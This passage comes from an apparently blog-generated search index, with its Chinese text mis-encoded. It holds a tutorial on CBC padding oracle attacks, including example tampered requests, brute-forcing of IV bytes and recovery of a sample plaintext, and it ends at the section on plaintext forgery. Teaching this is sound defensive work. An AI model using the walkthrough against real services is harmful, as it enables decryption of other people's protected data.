ç§å­ç†µ</strong>ï¼Œé¿å…ä½¿ç”¨ä½ç†µæˆ–å›ºå®šç§å­ã€‚</li><li><strong>å®šæœŸæ›´æ–°å†…éƒ¨çŠ¶æ€</strong>ï¼Œé¿å…å‘¨æœŸæ€§è¾“å‡ºå’Œå›æº¯æ”»å‡»ã€‚</li><li><strong>é€‰æ‹©é«˜è´¨é‡çš„ç®—æ³•</strong>ï¼Œé¿å…ä½¿ç”¨ç®€å•ã€è¿‡æ—¶çš„PRNGã€‚</li></ol><p>åœ¨é«˜å®‰å…¨æ€§åœºæ™¯ä¸‹ï¼Œå»ºè®®ç»“åˆ<strong>ç¡¬ä»¶éšæœºæ•°ç”Ÿæˆå™¨</strong>å’Œ<strong>åŠ å¯†å®‰å…¨ç®—æ³•</strong>ï¼Œä»¥æä¾›æ›´å¼ºçš„éšæœºæ€§å’Œå®‰å…¨æ€§ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> å¯†ç å­¦ç®—æ³•å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¯†ç å­¦ç®—æ³•å®‰å…¨ </tag>
            
            <tag> éšæœºæ•°å®‰å…¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>padding oracleæ”»å‡»</title>
      <link href="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/"/>
      <url>/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€CBCæ¨¡å¼ç®€ä»‹"><a href="#ä¸€ã€CBCæ¨¡å¼ç®€ä»‹" class="headerlink" title="ä¸€ã€CBCæ¨¡å¼ç®€ä»‹"></a>ä¸€ã€CBCæ¨¡å¼ç®€ä»‹</h1><p>CBCï¼ˆCipher Block Chainingï¼Œå¯†ç å—é“¾æ¨¡å¼ï¼‰æ˜¯ä¸€ç§åˆ†ç»„å¯†ç çš„åŠ å¯†æ¨¡å¼ï¼Œå®ƒé€šè¿‡å°†æ¯ä¸ªæ˜æ–‡å—ä¸å‰ä¸€ä¸ªå¯†æ–‡å—è¿›è¡Œå¼‚æˆ–æ“ä½œåå†åŠ å¯†ï¼Œä»¥ç¡®ä¿æ•°æ®çš„å®‰å…¨æ€§ã€‚</p><h2 id="1-1-CBCåŠ å¯†æµç¨‹"><a href="#1-1-CBCåŠ å¯†æµç¨‹" class="headerlink" title="1.1 CBCåŠ å¯†æµç¨‹"></a>1.1 CBCåŠ å¯†æµç¨‹</h2><p>åœ¨CBCæ¨¡å¼ä¸­ï¼Œé¦–å…ˆå¯¹æ˜æ–‡è¿›è¡Œåˆ†ç»„ï¼Œæ¯ä¸ªæ˜æ–‡å—å…ˆä¸å‰ä¸€ä¸ªå¯†æ–‡å—è¿›è¡Œå¼‚æˆ–åï¼Œå†è¿›è¡ŒåŠ å¯†ã€‚CBCæ¨¡å¼ä¸‹ï¼Œæ¯ä¸ªå¯†æ–‡å—ä¾èµ–äºå‰é¢çš„æ‰€æœ‰çš„æ˜æ–‡å—ã€‚</p><p>æ¶‰åŠåˆ°çš„æ¦‚å¿µï¼š</p><ol><li><strong>åˆå§‹åŒ–å‘é‡ï¼ˆIVï¼‰</strong>ï¼šCBCæ¨¡å¼ä½¿ç”¨ä¸€ä¸ªåˆå§‹åŒ–å‘é‡ï¼ˆIVï¼‰ï¼Œè¿™æ˜¯ä¸€ä¸ªéšæœºç”Ÿæˆçš„å€¼ï¼Œä¸ç¬¬ä¸€ä¸ªæ˜æ–‡å—è¿›è¡Œå¼‚æˆ–æ“ä½œã€‚IVçš„ä½œç”¨æ˜¯ä¸ºåŠ å¯†è¿‡ç¨‹æä¾›ä¸€ä¸ªéšæœºçš„èµ·ç‚¹ï¼Œç¡®ä¿ç›¸åŒçš„æ˜æ–‡å—åœ¨ä¸åŒçš„åŠ å¯†è¿‡ç¨‹ä¸­äº§ç”Ÿä¸åŒçš„å¯†æ–‡å—ã€‚</li></ol><h3 id="1-1-1-åŠ å¯†æµç¨‹"><a href="#1-1-1-åŠ å¯†æµç¨‹" class="headerlink" title="1.1.1 åŠ å¯†æµç¨‹"></a>1.1.1 åŠ å¯†æµç¨‹</h3><p>å…¶åŠ å¯†æµç¨‹ç¤ºæ„å›¾å¦‚ä¸‹ï¼š</p><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-29%2010.00.05.png" alt="CBCæ¨¡å¼åŠ å¯†æµç¨‹" style="zoom:50%;"><ul><li>å°†æ˜æ–‡åˆ†ä¸ºå›ºå®šå¤§å°çš„å—ï¼ˆé€šå¸¸æ˜¯8å­—èŠ‚æˆ–16å­—èŠ‚ï¼‰ã€‚</li><li>ç¬¬ä¸€ä¸ªæ˜æ–‡å—ä¸IVè¿›è¡Œå¼‚æˆ–æ“ä½œã€‚</li><li>å¼‚æˆ–åçš„ç»“æœé€šè¿‡åŠ å¯†ç®—æ³•ï¼ˆå¦‚AESï¼‰åŠ å¯†ï¼Œç”Ÿæˆç¬¬ä¸€ä¸ªå¯†æ–‡å—ã€‚</li><li>æ¯ä¸ªåç»­çš„æ˜æ–‡å—éƒ½ä¸å‰ä¸€ä¸ªå¯†æ–‡å—è¿›è¡Œå¼‚æˆ–æ“ä½œï¼Œç„¶åå†åŠ å¯†ï¼Œç”Ÿæˆä¸‹ä¸€ä¸ªå¯†æ–‡å—ã€‚</li></ul><p>å¯†æ–‡åˆ†ç»„3å—åˆ°æ˜æ–‡åˆ†ç»„1ã€æ˜æ–‡åˆ†ç»„2ã€æ˜æ–‡åˆ†ç»„3çš„å…±åŒå½±å“ã€‚</p><h3 id="1-1-2-è§£å¯†æµç¨‹"><a href="#1-1-2-è§£å¯†æµç¨‹" class="headerlink" title="1.1.2 è§£å¯†æµç¨‹"></a>1.1.2 è§£å¯†æµç¨‹</h3><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-29%2010.01.51.png" alt="CBCæ¨¡å¼è§£å¯†æµç¨‹" style="zoom:50%;"><ul><li>å°†å¯†æ–‡åˆ†ä¸ºç›¸åŒçš„å—å¤§å°ã€‚</li><li>ç¬¬ä¸€ä¸ªå¯†æ–‡å—é€šè¿‡è§£å¯†ç®—æ³•è§£å¯†ï¼Œç„¶åä¸IVè¿›è¡Œå¼‚æˆ–æ“ä½œï¼Œæ¢å¤å‡ºç¬¬ä¸€ä¸ªæ˜æ–‡å—ã€‚</li><li>æ¯ä¸ªåç»­çš„å¯†æ–‡å—éƒ½å…ˆè§£å¯†ï¼Œç„¶åä¸å‰ä¸€ä¸ªå¯†æ–‡å—è¿›è¡Œå¼‚æˆ–æ“ä½œï¼Œæ¢å¤å‡ºåŸå§‹çš„æ˜æ–‡å—ã€‚</li></ul><p>ä¸åŠ å¯†è¿‡ç¨‹ä¸åŒçš„æ˜¯åæ–‡åˆ†ç»„3ä»…å—å¯†æ–‡åˆ†ç»„2å’Œå¯†æ–‡åˆ†ç»„3çš„å…±åŒå½±å“ã€‚</p><h3 id="1-1-3-å¡«å……ï¼ˆPaddingï¼‰"><a href="#1-1-3-å¡«å……ï¼ˆPaddingï¼‰" class="headerlink" title="1.1.3 å¡«å……ï¼ˆPaddingï¼‰"></a>1.1.3 å¡«å……ï¼ˆPaddingï¼‰</h3><p>åˆ†ç»„å¸¦æ¥ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯æ˜æ–‡ä¸å¯èƒ½æ°å¥½æ˜¯blockçš„æ•´æ•°å€ï¼Œå¯¹äºä¸èƒ½æ•´é™¤å‰©ä½™çš„éƒ¨åˆ†æ•°æ®å°±æ¶‰åŠåˆ°å¡«å……æ“ä½œã€‚</p><p>åœ¨åŠ å¯†æœ€åä¸€ä¸ªä¸å®Œæ•´çš„æ˜æ–‡å—æ—¶ï¼Œéœ€è¦è¿›è¡Œå¡«å……ä»¥ç¡®ä¿å—çš„å¤§å°ç¬¦åˆåŠ å¯†ç®—æ³•çš„è¦æ±‚ã€‚å¸¸è§çš„å¡«å……æ–¹å¼æœ‰PKCS#5å’ŒOneAndZeroesã€‚</p><h4 id="1ï¼‰PKCS-5ï¼š"><a href="#1ï¼‰PKCS-5ï¼š" class="headerlink" title="1ï¼‰PKCS#5ï¼š"></a>1ï¼‰PKCS#5ï¼š</h4><p>åœ¨æœ€åä¸€ä¸ªblockä¸­å°†ä¸è¶³çš„Byteæ•°ä½œä¸ºByteå€¼è¿›è¡Œå¡«å……ï¼Œç¼ºå°‘nä¸ªByteï¼Œå°±å¡«å……nä¸ª0x0nï¼Œä¾‹å¦‚æœ€åä¸€ä¸ªåˆ†ç»„ï¼ˆblockï¼‰ç¼ºå°‘3ä¸ªbyteï¼Œå°±å¡«å……3ä¸ª0x03åˆ°ç»“å°¾ã€‚åœ¨è§£å¯†æ—¶ä¼šæ ¡éªŒæ˜æ–‡çš„å¡«å……æ˜¯å¦æ»¡è¶³è¯¥è§„åˆ™ï¼Œå¦‚æœæ˜¯ä»¥Nä¸ª0x0Nç»“æŸï¼Œåˆ™æ„å‘³ç€è§£å¯†æ“ä½œæ‰§è¡ŒæˆåŠŸï¼Œå¦åˆ™è§£å¯†æ“ä½œå¤±è´¥ã€‚</p><h4 id="2ï¼‰OneAndZeroesï¼š"><a href="#2ï¼‰OneAndZeroesï¼š" class="headerlink" title="2ï¼‰OneAndZeroesï¼š"></a>2ï¼‰OneAndZeroesï¼š</h4><p>åœ¨æœ€åä¸€ä¸ªBlockä¸­å°†ä¸è¶³çš„byteä½æ•°ä»¥ 0x80å¼€å¤´åç»­å…¨å¡«0x00çš„æ–¹å¼è¿›è¡Œå¡«å……ï¼Œè‹¥æœ€åä¸€ä¸ªBlockç¼ºå°‘3byteï¼Œåˆ™å¡«å……ï¼š0x80 0x00 0x00ã€‚</p><h1 id="äºŒã€Padding-Oracleæ”»å‡»åŸç†"><a href="#äºŒã€Padding-Oracleæ”»å‡»åŸç†" class="headerlink" title="äºŒã€Padding Oracleæ”»å‡»åŸç†"></a>äºŒã€Padding Oracleæ”»å‡»åŸç†</h1><p>è¿™ç§æ”»å‡»æ–¹å¼åœ¨2011å¹´çš„Pwnie Rewardsä¸­è¢«è¯„ä¸ºâ€œæœ€å…·æœ‰ä»·å€¼çš„æœåŠ¡å™¨æ¼æ´â€ï¼Œå› ä¸ºå®ƒèƒ½å¤Ÿç»•è¿‡å¯¹ç®—æ³•çš„ç›´æ¥ç ´è§£ï¼Œé€šè¿‡æ—è·¯æ”»å‡»çš„æ–¹å¼è¢«åˆ©ç”¨ã€‚</p><p>æ ¸å¿ƒåŸç†ï¼šæ˜æ–‡åˆ†ç»„å’Œå¡«å……ï¼ŒåŒæ—¶åº”ç”¨ç¨‹åºå¯¹äºå¡«å……å¼‚å¸¸çš„å“åº”å¯ä»¥ä½œä¸ºåé¦ˆã€‚</p><h2 id="2-1-åˆ©ç”¨åœºæ™¯"><a href="#2-1-åˆ©ç”¨åœºæ™¯" class="headerlink" title="2.1 åˆ©ç”¨åœºæ™¯"></a>2.1 åˆ©ç”¨åœºæ™¯</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://www.example.com/decrypt.jsp?data<span class="token operator">=</span>0000000000000000EFC2807233F9D7C097116BB33E813C5E<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å½“æ”»å‡»è€…åœ¨ç¯¡æ”¹dataå€¼æ—¶ä¼šæœ‰ä»¥ä¸‹ä¸åŒçš„å“åº”ï¼š</p><ul><li>å¦‚æœdataå€¼æ²¡æœ‰è¢«ç¯¡æ”¹ï¼Œåˆ™è§£å¯†æˆåŠŸï¼Œå¹¶ä¸”ä¸šåŠ¡æ ¡éªŒæˆåŠŸï¼Œå“åº”200</li><li>å¦‚æœdataå€¼è¢«ç¯¡æ”¹ï¼ŒæœåŠ¡ç«¯æ— æ³•å®Œæˆè§£å¯†ï¼Œè§£å¯†æ ¡éªŒå¤±è´¥ï¼Œåˆ™å“åº”500</li><li>å¦‚æœdataå€¼è¢«ç¯¡æ”¹ï¼Œä½†æ˜¯æœåŠ¡ç«¯è§£å¯†æˆåŠŸï¼Œä½†ä¸šåŠ¡é€»è¾‘æ ¡éªŒå¤±è´¥ï¼Œåˆ™å¯èƒ½è¿”å›200æˆ–302ç­‰å“åº”ç ,è€Œä¸æ˜¯å“åº”500</li></ul><p>æ”»å‡»è€…åªéœ€å…³æ³¨è§£å¯†æˆåŠŸå’Œè§£å¯†å¤±è´¥çš„å“åº”å³å¯ï¼ˆç¬¬ä¸‰ç§å±äºè§£å¯†æˆåŠŸçš„å“åº”ï¼‰ï¼Œå³å¯å®Œæˆæ”»å‡»ã€‚</p><h2 id="2-2-ç ´è§£å¯†æ–‡"><a href="#2-2-ç ´è§£å¯†æ–‡" class="headerlink" title="2.2 ç ´è§£å¯†æ–‡"></a>2.2 ç ´è§£å¯†æ–‡</h2><h3 id="2-2-1-æ ¸å¿ƒæ€è·¯"><a href="#2-2-1-æ ¸å¿ƒæ€è·¯" class="headerlink" title="2.2.1 æ ¸å¿ƒæ€è·¯"></a>2.2.1 æ ¸å¿ƒæ€è·¯</h3><p>æ”»å‡»è€…é€šè¿‡ä¿®æ”¹å¯†æ–‡å¹¶å‘é€ç»™æœåŠ¡å™¨ï¼Œè§‚å¯ŸæœåŠ¡å™¨å¯¹ä¸åŒå¯†æ–‡çš„å“åº”ã€‚å¦‚æœå¯†æ–‡çš„å¡«å……æ­£ç¡®ï¼ŒæœåŠ¡å™¨ä¼šè¿”å›ä¸€ä¸ªæˆåŠŸçš„å“åº”ï¼›å¦‚æœå¡«å……ä¸æ­£ç¡®ï¼ŒæœåŠ¡å™¨ä¼šè¿”å›ä¸€ä¸ªé”™è¯¯å“åº”ã€‚æ”»å‡»è€…åˆ©ç”¨è¿™ç§å·®å¼‚æ€§æ¥ç¡®å®šå¯†æ–‡çš„æ­£ç¡®å¡«å……ï¼Œä»è€Œé€æ­¥è§£å¯†å¯†æ–‡æˆ–æ„é€ å‡ºä»»æ„æ˜æ–‡çš„åˆæ³•å¯†æ–‡ã€‚</p><h3 id="2-2-2-æ”»å‡»è¿‡ç¨‹"><a href="#2-2-2-æ”»å‡»è¿‡ç¨‹" class="headerlink" title="2.2.2 æ”»å‡»è¿‡ç¨‹"></a>2.2.2 æ”»å‡»è¿‡ç¨‹</h3><p>å‡è®¾æœ‰è¿™æ ·ä¸€ä¸ªåº”ç”¨ï¼Œè¯·æ±‚å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://www.example.com/decrypt.jsp?data<span class="token operator">=</span>7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å³clientç»™serveræäº¤çš„å‚æ•°ä¸º<code>7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6</code> æ‰èƒ½è¯·æ±‚æ­£å¸¸çš„æœåŠ¡.</p><h4 id="1ï¼‰å†…åœ¨åŠ è§£å¯†è¿‡ç¨‹ï¼ˆä¸ä¸ºæ”»å‡»è€…æ‰€çŸ¥æ™“ï¼‰"><a href="#1ï¼‰å†…åœ¨åŠ è§£å¯†è¿‡ç¨‹ï¼ˆä¸ä¸ºæ”»å‡»è€…æ‰€çŸ¥æ™“ï¼‰" class="headerlink" title="1ï¼‰å†…åœ¨åŠ è§£å¯†è¿‡ç¨‹ï¼ˆä¸ä¸ºæ”»å‡»è€…æ‰€çŸ¥æ™“ï¼‰"></a>1ï¼‰å†…åœ¨åŠ è§£å¯†è¿‡ç¨‹ï¼ˆä¸ä¸ºæ”»å‡»è€…æ‰€çŸ¥æ™“ï¼‰</h4><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-29%2010.03.19.png" alt="IV+å¯†æ–‡å€¼" style="zoom:80%;"><p>IVæ·»åŠ åœ¨å¯†æ–‡çš„å‰æ®µï¼Œå³æœ€å‰é¢8ä¸ªå­—èŠ‚ã€‚</p><ul><li>åŠ å¯†è¿‡ç¨‹</li></ul><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-28%2010.26.09.png" alt="åŠ å¯†è¿‡ç¨‹" style="zoom:80%;"><ul><li>è§£å¯†è¿‡ç¨‹</li></ul><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-28%2010.27.56.png" alt="è§£å¯†è¿‡ç¨‹" style="zoom:80%;"><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè§£å¯†ä¹‹åçš„æœ€åä¸€ä¸ªæ•°æ®å—ï¼Œå…¶ç»“å°¾åº”è¯¥åŒ…å«æ­£ç¡®çš„å¡«å……åºåˆ—ï¼Œå¦‚æœä¸æ»¡è¶³ï¼ŒåŠ è§£å¯†ç¨‹åºä¼šè¿”å›å¼‚å¸¸ï¼ˆ500ï¼‰ã€‚</p><h4 id="2ï¼‰æ”»å‡»è€…è§†è§’ç ´è§£å¯†æ–‡"><a href="#2ï¼‰æ”»å‡»è€…è§†è§’ç ´è§£å¯†æ–‡" class="headerlink" title="2ï¼‰æ”»å‡»è€…è§†è§’ç ´è§£å¯†æ–‡"></a>2ï¼‰æ”»å‡»è€…è§†è§’ç ´è§£å¯†æ–‡</h4><ul><li>IVå€¼ç½®ç©º</li></ul><p>å–ç¬¬ä¸€ä¸ªBlockçš„å¯†æ–‡ï¼Œå¹¶å°†åˆå§‹åŒ–å‘é‡ç½®ä¸º0ï¼Œå³ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> F8 <span class="token number">51</span> D6 CC <span class="token number">68</span> FC <span class="token number">95</span> <span class="token number">37</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™æ—¶çš„è¯·æ±‚å’Œå“åº”ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Request: http://sampleapp/home.jsp?<span class="token environment constant">UID</span><span class="token operator">=</span>0000000000000000F851D6CC68FC9537Response: <span class="token number">500</span> - Internal Server Error<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å›å¤500è¯´æ˜å¡«å……å¼‚å¸¸ï¼ŒåŸå› æ˜¯å®ƒçš„ç»“å°¾æœªåŒ…å«æ­£ç¡®çš„å¡«å……å­—èŠ‚ï¼š</p><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-28%2010.32.04.png" alt="0000000000000000F851D6CC68FC9537è§£å¯†å¤±è´¥" style="zoom:80%;"><p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œåœ¨è§£å¯†ä¹‹åï¼Œæ•°æ®å—çš„æœ«å°¾å¹¶æ²¡æœ‰åŒ…å«æ­£ç¡®çš„å¡«å……åºåˆ—ï¼Œå› æ­¤å‡ºç°äº†å¼‚å¸¸ã€‚</p><ul><li>æ¥ä¸‹æ¥å°è¯•çˆ†ç ´ï¼Œä½¿å¾—æœ€åçš„å¡«å……åºåˆ—æ»¡è¶³<code>nä¸ª0xn</code>çš„æ¡ä»¶</li></ul><p>æˆ‘ä»¬å°†IVåŠ 1ï¼Œå¹¶ä¸”å‘é€åŒæ ·å¯†æ–‡</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Request: http://sampleapp/home.jsp?<span class="token environment constant">UID</span><span class="token operator">=</span>0000000000000001F851D6CC68FC9537Response: <span class="token number">500</span> - Internal Server Error<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-28%2010.34.03.png" alt="0000000000000001F851D6CC68FC9537è§£å¯†å¤±è´¥" style="zoom:80%;"><p>é‡å¤å‘é€è¿™æ ·çš„è¯·æ±‚ï¼Œæ¯æ¬¡å°†IVçš„æœ€åä¸€ä¸ªå­—èŠ‚åŠ ä¸€ï¼ˆç›´è‡³<code>0xFF</code>ï¼‰ï¼Œé‚£ä¹ˆæœ€ç»ˆæˆ‘ä»¬å°†ä¼šäº§ç”Ÿä¸€ä¸ªåˆæ³•çš„å•å­—èŠ‚å¡«å……åºåˆ—ï¼ˆ<code>0x01</code>ï¼‰</p><p>å¯¹äºå¯èƒ½çš„256ä¸ªå€¼ä¸­ï¼Œåªæœ‰ä¸€ä¸ªå€¼ä¼šäº§ç”Ÿæ­£ç¡®çš„å¡«å……å­—èŠ‚<code>0x01</code>ï¼Œé‡ä¸Šè¿™ä¸ªå€¼çš„æ—¶å€™ï¼Œä¼šå¾—åˆ°ä¸€ä¸ªä¸åŒäºå…¶ä»–255ä¸ªè¯·æ±‚çš„å›å¤ç»“æœã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Request: http://sampleapp/home.jsp?<span class="token environment constant">UID</span><span class="token operator">=</span>000000000000003CF851D6CC68FC9537Response: <span class="token number">200</span> OK<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-28%2010.36.05.png" alt="000000000000003CF851D6CC68FC9537è§£å¯†æˆåŠŸ" style="zoom:80%;"><ul><li>æ¨æ–­å‡ºä¸­é—´å€¼ï¼ˆIntermediary Valueï¼‰çš„æœ€åä¸€ä¸ªå­—èŠ‚ï¼ˆæ³¨æ„ä¸­é—´å€¼æ”»å‡»è€…ä¸çŸ¥é“ï¼Œä»–æ˜¯æ”»å‡»è€…æ”»å‡»çš„ç›®æ ‡ï¼‰</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Intermediary Byte å¼‚æˆ– <span class="token number">0</span>Ã—3C <span class="token operator">==</span> <span class="token number">0</span>Ã—01, Intermediary Byte <span class="token operator">==</span> <span class="token number">0</span>Ã—3C ^ <span class="token number">0</span>Ã—01, Intermediary Byte <span class="token operator">==</span> <span class="token number">0</span>Ã—3D<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>é‡ç‚¹ï¼šç¬¬ä¸€ç»„å¯†æ–‡è§£å¯†çš„ä¸­é—´å€¼æ˜¯ä¸€ç›´ä¸å˜çš„ï¼ŒåŒæ ·ä¹Ÿæ˜¯æ­£ç¡®çš„ï¼Œæˆ‘ä»¬é€šè¿‡æ„é€ IVå€¼ï¼Œä½¿å¾—æœ€åä¸€ä½å¡«å……å€¼æ»¡è¶³0x01ï¼Œç¬¦åˆpaddingè§„åˆ™ï¼Œåˆ™æ„å‘³ç€ç¨‹åºè§£å¯†æˆåŠŸï¼ˆå½“ç„¶è§£å¯†çš„ç»“æœè‚¯å®šä¸æ˜¯åŸæ¥çš„æ˜æ–‡ï¼‰ï¼Œé€šè¿‡å¾ªç¯æµ‹è¯•çš„æ–¹æ³•ï¼ŒçŒœè§£å‡ºä¸­é—´å€¼çš„æœ€åä¸€ä½ï¼Œå†åˆ©ç”¨åŒæ ·çš„æ–¹å¼çŒœè§£å‰é¢çš„ä¸­é—´å€¼ï¼Œç›´åˆ°è·å–åˆ°å®Œæ•´çš„ä¸­é—´å€¼ã€‚</p><ul><li>æ¨æ–­å‡ºä¸­é—´å€¼çš„å€’æ•°ç¬¬äºŒä¸ªå­—èŠ‚ã€‚</li></ul><p>æ„é€ å¡«å……å€¼ä¸º<code>0x02 0x02</code>çš„åœºæ™¯ï¼Œå³å­˜åœ¨2ä¸ªå¡«å……å­—èŠ‚ï¼Œå¡«å……å€¼ä¸º<code>0x02</code>ã€‚</p><p>æ­¤æ—¶æˆ‘ä»¬å·²ç»çŸ¥é“äº†ä¸­é—´å€¼å¾—æœ€åä¸€ä½ä¸º<code>0x3D</code>,è®¡ç®—å‡ºåˆå§‹å‘é‡çš„æœ€åä¸€ä½ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">0x3D xor 0x02 <span class="token operator">=</span> 0x3F<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å³åˆå§‹å‘é‡ä¸º<code>0000000000000003F</code></p><p>éå†å€’æ•°ç¬¬äºŒä¸ªå­—èŠ‚ä»<code>0x00~0xFF</code>ï¼Œç›´åˆ°å“åº”æˆåŠŸ.</p><p>çŒœè§£å‡ºä¸­é—´å€¼å¾—åä¸¤ä¸ªå­—èŠ‚åˆ†åˆ«ä¸º <code>0x26 0x3D</code></p><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-28%2010.45.22.png" alt="ç ´è§£å‡ºä¸­é—´å€¼çš„å€’æ•°ç¬¬äºŒä¸ªå­—èŠ‚" style="zoom:80%;"><ul><li>æ¨æ–­å‡ºæ•´ä¸ªä¸­é—´å€¼</li></ul><p>è¿ç”¨è¿™ç§æŠ€å·§ï¼Œæˆ‘ä»¬å¯ä»¥æœ€ç»ˆå¾—åˆ°è§£å¯†åçš„ä¸­é—´å€¼ï¼Œä¹Ÿå°±æ˜¯å½“æ•´ä¸ªæ•°æ®å—çš„å¡«å……å€¼éƒ½æ˜¯<code>0x08</code></p><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/%E6%88%AA%E5%B1%8F2024-11-28%2010.46.30.png" alt="ä¸­é—´å€¼å®Œæ•´æ¨æ–­" style="zoom:80%;"><ul><li>æ˜æ–‡ç ´è§£</li></ul><p>å½“ç¬¬ä¸€ç»„å¯†æ–‡çš„ä¸­é—´å€¼çŒœè§£æˆåŠŸåï¼Œæˆ‘ä»¬å°†ä¸­é—´å€¼å’Œå·²çŸ¥çš„IVåšå¼‚æˆ–ï¼Œåˆ™å¾—åˆ°ç¬¬ä¸€ç»„å¯†æ–‡çš„æ˜æ–‡ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">0x39 0x73 0x23 0x22 0x07 0x6A 0x26 0x3D  å¼‚æˆ–  0x7B 0x21 0x6A 0x63 0x49 0x51 0x17 0x0F<span class="token operator">=</span> BRIAN<span class="token punctuation">;</span><span class="token number">12</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ç»­ç ´è§£ç¬¬äºŒç»„å¯†æ–‡ï¼Œç¬¬äºŒç»„å¯†æ–‡çš„IVå‘é‡æ˜¯ç¬¬ä¸€ç»„å¯†æ–‡ï¼ŒæŒ‰ç…§ä¸Šè¿°çš„é€»è¾‘æ„é€ ç¬¬ä¸€ç»„å¯†æ–‡ï¼Œå³å¯ç ´è§£å‡ºç¬¬äºŒç»„æ˜æ–‡ã€‚</p><h3 id="2-2-3-æ€è·¯æ€»ç»“"><a href="#2-2-3-æ€è·¯æ€»ç»“" class="headerlink" title="2.2.3 æ€è·¯æ€»ç»“"></a>2.2.3 æ€è·¯æ€»ç»“</h3><ul><li>å°†IVæœ€åä¸€ä¸ªå­—èŠ‚è®¾ç½®ä¸º0x1ï¼Œä¸æ–­è°ƒæ•´IVæœ€åä¸€ä¸ªå­—èŠ‚ï¼ˆ0x01-0xffï¼‰ï¼Œçˆ†ç ´ä½¿å¾—å¡«å……è§„åˆ™æ­£ç¡®(7byte+0x01)ï¼Œå¾—åˆ°ä¸­é—´å€¼çš„æœ€åä¸€ä¸ªå­—èŠ‚ã€‚</li><li>åœ¨å¾—åˆ°æœ€åä¸€ä¸ªå­—èŠ‚çš„ä¸­é—´å€¼åï¼Œå°†IVæœ€åä¸€ä¸ªå­—èŠ‚è®¾ç½®ä¸º0x02ï¼Œè®¡ç®—IVçš„æœ€åä¸€ä¸ªå­—èŠ‚ã€‚</li><li>ä¸æ–­è°ƒæ•´IVå€’æ•°ç¬¬äºŒä¸ªå­—èŠ‚ï¼ˆ0x01-0xffï¼‰ï¼Œçˆ†ç ´ä½¿å¾—å¡«å……è§„åˆ™æ­£ç¡®ï¼ˆ6byte+0x02+0x02ï¼‰ï¼Œå¾—åˆ°å€’æ•°ç¬¬äºŒä¸ªå­—èŠ‚çš„ä¸­é—´å€¼ã€‚</li><li>ä¾æ¬¡ç±»æ¨è·å¾—æ•´ä¸ªä¸­é—´å€¼ã€‚</li><li>ä¸­é—´å€¼å’ŒIVå¼‚æˆ–è·å¾—æ˜æ–‡ã€‚</li></ul><h2 id="2-3ä¼ªé€ æ˜æ–‡"><a href="#2-3ä¼ªé€ æ˜æ–‡" class="headerlink" title="2.3ä¼ªé€ æ˜æ–‡"></a>2.3ä¼ªé€ æ˜æ–‡</h2><p>é€šè¿‡å¯†æ–‡çš„ç 